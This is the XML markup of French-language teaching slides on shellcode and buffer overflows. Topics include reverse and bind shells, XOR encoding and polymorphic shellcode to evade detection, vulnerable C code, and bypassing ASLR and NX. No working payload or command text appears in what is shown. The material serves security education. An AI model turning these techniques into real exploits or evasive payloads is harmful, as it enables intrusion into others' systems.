              <a:t>netgear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054715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69F72C-E3FB-4C48-AEBD-AF7AC0D74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A22715-D05D-465E-A9CB-5AD7BC6C9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4197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11DA0E-6E88-FB1C-0B6C-2474B801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180" y="2288987"/>
            <a:ext cx="4009639" cy="2283013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C'EST QUOI UN SHELLCODE ?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40C80-E63C-8443-D4BB-3515F5EBC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435" y="762000"/>
            <a:ext cx="4338577" cy="3048000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr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Objectifs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Comprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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qu'est</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un shellcode.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Explorer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>leur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> conception et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>leurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> usages dans les exploits.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Graphic 6" descr="Bug under Magnifying Glass">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E0AF59BC-7900-EA25-9AE9-5BC5014E5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4645" y="4309035"/>
            <a:ext cx="1786965" cy="178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13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AABF64-1A2D-8FED-29BA-7235A6BCC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Qu’est-ce qu’un shellcode ?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243DA0-7FCC-DA63-A6F0-A59BE47DAF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0100156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88207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A75897-6FC9-5E33-FFEA-F9A68B97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Pourquoi les shellcodes sont importants ?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407BC5-C004-876C-FE38-E99D41CFAA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3040665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479572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CA8BC-7A96-2642-AEED-04CD392FF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Types de shellcodes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D66884-F67E-FCC5-9047-381277F01B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9716484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377089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CE76C-2E40-2700-A809-380DEE03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Shellcode Linux vs Windows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28F5FD-B29E-320D-849C-2FFFFD250A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3904491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122730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F9E3E-C05C-B923-EC9A-3E52A9282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d’un shellcode simple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6184C-67D1-22B4-83F9-C68816903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Étapes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Initialisation des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registres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Création</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la charge utile.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Exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>commande</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sous Linux: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49F297-435A-5BD6-E7B5-4F41E028B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191000"/>
            <a:ext cx="7772400" cy="30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9679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EF1C0-026C-2D68-A5C4-68288E1F7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Environnement de conception des shellcodes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2A56B-BCDD-3081-0830-B06B83479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r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>nécessaires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1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Linux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Assembleur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> NASM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> GCC.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GDB pour le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>débogage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Windows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Assemblage avec MASM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Visual Studio.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Debugging avec Immunity Debugger </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> x64dbg.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25802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E9E845-FBD0-EA9D-4BD0-E15DA90AD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Encodage des shellcodes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E7044C-7633-AFF1-D2D9-E46131D440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7880202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38202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805BF-29A9-3E6B-45ED-B7514E78A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d’encodage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> simple (XOR)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7A42A-34F9-F850-4ECD-A1BEFEC48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Principe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Appliquer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opération</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> XOR pour modifier les octets du shellcode.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Décoder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> au moment de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution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2E3A7-4147-E704-E902-E7915284B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191000"/>
            <a:ext cx="7772400" cy="244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5948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9AFD-D346-ABAB-264F-29D138EBD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Reverse Shell TCP (Linux)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5DD7C-A955-2D44-11CF-A99FF2024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But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Faire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sorte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> que la machine </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>initie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connexion </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'attaquant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D62340-BB82-1A24-A94A-91A2D497A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29000"/>
            <a:ext cx="7772400" cy="244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80896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70B9-8827-FE03-2F22-79E850967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Reverse Shell TCP (Windows)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10A39-2115-B53E-43EA-EC2930E80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err="1"/>
              <a:t>Spécificités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> Windows :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Utilisation des API Winsock pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>établir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connexion.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>simplifié</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :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F7AA6-8080-1A90-068C-7717AB959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84429"/>
            <a:ext cx="7772400" cy="30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7968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3E55C81-7F9A-4F5B-B51D-9FA5169EE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61999 w 12192000"/>
              <a:gd name="connsiteY0" fmla="*/ 762000 h 6858000"/>
              <a:gd name="connsiteX1" fmla="*/ 761999 w 12192000"/>
              <a:gd name="connsiteY1" fmla="*/ 6096000 h 6858000"/>
              <a:gd name="connsiteX2" fmla="*/ 11426150 w 12192000"/>
              <a:gd name="connsiteY2" fmla="*/ 6096000 h 6858000"/>
              <a:gd name="connsiteX3" fmla="*/ 11426150 w 12192000"/>
              <a:gd name="connsiteY3" fmla="*/ 76200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761999" y="762000"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="761999" y="6096000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11426150" y="6096000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11426150" y="762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6CD8F4-6F43-5158-42BD-2D6B05F3E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86000"/>
            <a:ext cx="3810000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 dirty="0"/>
              <a:t>Bind Shell</a:t>
            </a:r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188842-CF6F-1A27-10AD-3B355C804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380193"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6096001" y="1524000"/>
          <a:ext cx="4571999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858904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1D9B79-C77D-99A7-7B7D-7C0D9898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Shellcodes polymorphes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ADD4C3-64A1-1825-CEAE-4B6D284075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839635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15564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608B76-D93C-4249-4735-DF30B265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Limitation des NULL bytes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FB0016-A15F-0B95-E927-02FA129DC2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463743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860070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0987B-21BD-2E34-459B-7DC10E4D9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Sécurité &amp; Shellcode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88001-D298-7E44-1137-F797F224B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/>
          </a:bodyPr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Limites</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> des shellcodes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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de protection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>avancés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (EDR).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Problèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>liés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> aux protections </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modernes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (ASLR, DEP).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981570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B9A8C-179C-B752-84DC-29303F4E3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Comprendre les buffer overflows sous Linux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661A1-30BF-4671-ABA0-F75D019DA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/>
          </a:bodyPr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Objectifs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Comprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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qu’est</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un buffer overflow.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Identifier les protections </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>courantes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (ASLR, NX).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Apprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des techniques </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’exploitation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Ret2Libc et ROP.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45874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19FF8-BECD-D823-0DD3-7FD650BCA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Qu’est-ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>qu’un</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> buffer overflow ?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A4978-F91A-9F14-97D6-7882580C1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Définition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> simple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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>buffer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zone </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour stocker des données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>temporaires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>overflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>produit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>lorsque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>écrites</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dépassent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la taille du buffer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>visuel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/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b="1" dirty="0"/>
              <a:t>Buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>attendu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>[AAAA][BBBB][CCCC]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Données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>écrites</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>[AAAA][BBBB][CCCC][DDDD][EE]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431248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02330-F821-93CC-C017-2F0177F2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 sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pourquoi les buffer overflows sont dangereux ?</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="26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D1BF28-0028-6AC5-D9DD-3C98613D78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7942993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362342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19F0-E38D-04D4-C0A1-1A479E1F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Comprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la pile (stack)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D0DC7-7B69-69DF-AB76-896669AC2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Structure de la pile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Organisation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b="1" dirty="0"/>
              <a:t>frames</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>appelée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Une frame </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contient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Variables locales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Adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de retour</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pointeur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'instruction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécuter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> après).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C5719A-F91D-4A64-FAB1-48D231918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848627"/>
            <a:ext cx="7772400" cy="353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4593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7DD8518-4289-43CE-9E36-8E7E0D7DD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C99D7C-C853-9DE4-BC59-D343B20DA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897" y="762001"/>
            <a:ext cx="4991103" cy="114100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2200" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2200"/>
              <a:t> pratique d’un buffer overflow simple</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2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9F369-7E0D-B1B2-3BD2-CBE034339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97" y="2286000"/>
            <a:ext cx="4991103" cy="3809999"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Problème</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/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La </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> gets() ne </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>limite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pas la taille des entrées.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En </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>saisissant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chaîne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> plus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>grande</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> que 8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>caractères</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>écrase</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de retour.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C5B46-6EAA-C70B-657B-972ED5C7C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396" y="1655869"/>
            <a:ext cx="7870509" cy="489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10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473D5-9148-8904-55EE-F2164F5C6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 sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Comprendre les protections modernes (ASLR)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2600">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill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E4C865FE-6E98-A2B2-AB32-F9852292F9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016383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758205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C74BF-24F5-AA43-AB23-79D755E82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Qu’est-ce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> que NX (Non-Executable Stack)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A7B11-5933-C1EE-9BA2-2BDDF6147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Objectif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Empêcher</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>injecté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans la pile.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Fonctionnement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Marque </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>certaines</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> zones </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécutables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : la pile).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1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Injecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un shellcode sur la pile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>devient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> inutile car il ne sera pas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécutable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70394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8749-CE65-6D2D-B68B-816669FB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Buffer Overflow - Cas de base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AD37E-8F0C-6031-EAF3-3F1C15E05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 err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (C) 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Explication :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> ne </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vérifie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pas la taille de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’entrée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Dépassement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> possible, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>permettant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réécrire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’espace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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D4E36F-C421-04C1-ACA1-73D7093A3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762" y="2286000"/>
            <a:ext cx="7772400" cy="30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0987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3078-39E9-3E2F-A677-49B8B567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Exploitation sans protection (1/2)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6E17F-722D-E0BA-52F5-1DE65E36C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Prérequis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Aucune</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> protection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>activée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (pas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’ASLR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, pas de NX).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Méthode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Réécriture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de retour dans la pile.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Étapes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Identifier la taille du buffer.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Injecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du shellcode.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Réécrire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’EIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (Extended Instruction Pointer) avec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du shellcode.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561984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6B71-AF21-DFA7-55DD-EBEEEF5C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Exploitation sans protection (2/2)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A3951-3756-C1AD-DBA3-FEB74F442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d’exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>basique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (python) :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9C7619-6F81-B3A4-4A70-9F5C190C3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83" y="3080479"/>
            <a:ext cx="7772400" cy="287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5197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5B23-8FA1-E191-3AC1-727B5225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Exploitation avec ASLR (1/2)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1F0F1-B715-9695-21EA-A3E6857AE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ASLR (Address Space Layout Randomization)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Change les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>adresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécution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Impact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Rend les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>adresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la pile et du stack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>imprévisibles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188298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B7537-E84A-6A3B-CA21-AF199079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Exploitation avec ASLR (2/2)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5652C-AF95-2225-1549-825C8F200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Contournement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Bruteforce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Répéter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exploit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essayant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
